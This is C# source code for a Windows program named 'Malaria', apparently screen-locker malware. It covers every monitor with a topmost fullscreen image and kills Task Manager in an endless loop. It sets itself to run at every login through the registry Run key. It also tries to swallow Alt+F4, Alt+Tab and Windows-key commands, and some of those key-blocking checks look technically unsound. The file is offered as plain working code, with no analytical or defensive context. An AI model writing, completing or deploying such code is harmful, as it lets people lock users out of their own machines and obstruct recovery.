using System.Diagnostics;
using Malaria.Properties;
using Microsoft.Win32;

namespace Malaria;

public partial class Form1 : Form
{
    public Form1()
    {
        DisplayImageOnAllScreens();
        new Thread(KillTaskManager).Start();
        new Thread(AutoStart).Start();

        Hide();
        Visible = false;
        KeyPreview = true;
    }
    
    private static void AutoStart()
    {
        var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey?.SetValue("Malaria", Application.ExecutablePath);
    }

    private static void DisplayImageOnAllScreens()
    {
        foreach (var screen in Screen.AllScreens)
        {
            var form = new Form
            {
                StartPosition = FormStartPosition.CenterScreen,
                Location = screen.Bounds.Location,
                Size = screen.Bounds.Size,
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                TopMost = true,
                BackgroundImageLayout = ImageLayout.Stretch
            };

            var imageResource = Resources.ResourceManager.GetObject("bg");
            form.BackgroundImage = imageResource switch
            {
                byte[] imageBytes => Image.FromStream(new MemoryStream(imageBytes)),
                Image image => image,
                _ => form.BackgroundImage
            };

            form.Show();
        }
    }

    private static void KillTaskManager()
    {
        while (true)
        {
            var processes = Process.GetProcessesByName("taskmgr");
            foreach (var process in processes) process.Kill();
        }
    }

    protected override void WndProc(ref Message m)
    {
        const int wmSysCommand = 0x0112;
        const int scClose = 0xF060;
        const int wmKeyDown = 0x0100;
        const int wmKeyUp = 0x0101;

        // ALT + F4
        if (m.Msg == wmSysCommand && (int)m.WParam == scClose) return;

        // Alt + Tab
        if (m.Msg == wmKeyDown || m.Msg == wmKeyUp)
        {
            var key = (Keys)m.WParam.ToInt32();

            // Alt+Tab is pressed
            if ((ModifierKeys & Keys.Alt) != 0 && key == Keys.Tab) return;

            // Alt+Esc is pressed
            if ((ModifierKeys & Keys.Alt) != 0 && key == Keys.Escape) return;
        }
        
        // Windows
        if (m.Msg == wmSysCommand && (int)m.WParam == 0x0201) return;
        
        // Windows + Tab
        if (m.Msg == wmSysCommand && (int)m.WParam == 0x0023) return;

        base.WndProc(ref m);
    }
}